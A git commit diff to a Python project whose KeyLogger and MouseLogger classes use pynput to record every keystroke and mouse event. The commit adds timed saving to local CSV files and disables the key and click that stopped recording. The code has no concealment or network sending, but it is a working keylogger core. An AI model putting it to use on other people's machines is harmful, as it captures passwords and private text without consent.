0def801a93570b0456a6ae031f6d6767804ea92e
Aditya <adityajha2103@gmail.com>
2023-10-02 13:01:33 +0530

    Added saving of data to file after specified interval

--- Modules/KeyStroke.py
+++ Modules/KeyStroke.py
@@ -1,5 +1,5 @@
 from pynput import keyboard
-import pynput 
+import threading
 class KeyLogger:
     # Map the special keys to their respective characters
     key_map = {
@@ -7,13 +7,21 @@ class KeyLogger:
         "Key.backspace": "\b",
         "Key.enter": "\n",
     }
-    def __init__(self) -> None:
+    def __init__(self, save=True, interval=60) -> None:
         self.log = "" # Logs all the keystrokes in string format (only the characters, not the special keys)
         self.complete = "" # Logs all the keystrokes in string format (including the special keys)
 
         # Start the listener
+        # if(start):
         with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+            if(save):
+                threading.Timer(interval, self.save).start()
             listener.join()
+    
+    # def start(self):
+    #     with keyboard.Listener(onpress=self.on_press, on_release=self.on_release) as listener:
+    #         threading.Timer(10, self.save).start()
+    #         listener.join()
     
     # Actions to perform when a key is pressed
     def on_press(self, key):
@@ -34,9 +42,20 @@ class KeyLogger:
     # Actions to perform when a key is released
     def on_release(self, key):
         # Exit when <ESCAPE> key is pressed
-        if key == keyboard.Key.esc:
-            # Prints the keystrokes
-            print("Filtered Text: " + self.log) # Prints the keystrokes without the special keys
-            print("Complete Text: " + self.complete) # Prints the keystrokes with the special keys
-            raise pynput.StopException # Stop the listener
-            # return False # Stop the listener
+        # if key == keyboard.Key.esc:
+        #     # Prints the keystrokes
+        #     print("Filtered Text: " + self.log) # Prints the keystrokes without the special keys
+        #     print("Complete Text: " + self.complete) # Prints the keystrokes with the special keys
+        #     raise pynput.StopException # Stop the listener
+        #     # return False # Stop the listener
+        pass
+
+    def save(self):
+        print("Saving to File...")
+        print(self.log)
+        print(self.complete)
+        with open("filtered_keystrokes.csv", "w") as f:
+            f.write(self.log)
+
+        with open("complete_keystrokes.csv", "w") as f:
+            f.write(self.complete) 
--- Modules/MouseRecorder.py
+++ Modules/MouseRecorder.py
@@ -1,14 +1,17 @@
 import time
+import threading
 import numpy as np
 from pynput import mouse
 
 
 class MouseLogger:
-    def __init__(self) -> None:
+    def __init__(self, save=True, interval=60) -> None:
         # Logs all the mouse clicks in 2D list format, where each element is a list of 4 elements: [time, x, y, Action]
         self.log = np.array([["Time", "X", "Y", "Action"]])
 
         with mouse.Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as listener:
+            if(save):
+                threading.Timer(interval, self.save).start()
             listener.join()
     
     def on_click(self, x, y, button, pressed):
@@ -18,12 +21,12 @@ class MouseLogger:
             # print("Mouse clicked at: " + str(x) + ", " + str(y))
 
         # Exits on right click
-        if(button == mouse.Button.right):
-            print(self.log)
-            print(self.log.shape)
-            # with open("log.csv", "w") as f:
-            #     np.savetxt(f, self.log, delimiter=",", fmt="%s")
-            return False
+        # if(button == mouse.Button.right):
+        #     print(self.log)
+        #     print(self.log.shape)
+        #     # with open("log.csv", "w") as f:
+        #     #     np.savetxt(f, self.log, delimiter=",", fmt="%s")
+        #     return False
 
     def on_move(self, x, y):
         self.log = np.append(self.log, [[round(time.time()), x, y, "MOVE"]], axis=0)
@@ -39,3 +42,7 @@ class MouseLogger:
         elif(dx < 0):
             scroll += "Left"
         self.log = np.append(self.log, [[round(time.time()), x, y, scroll]], axis=0)
+
+    def save(self):
+        with open("mouse-click.csv", "w") as f:
+            np.savetxt(f, self.log, delimiter=",", fmt="%s")
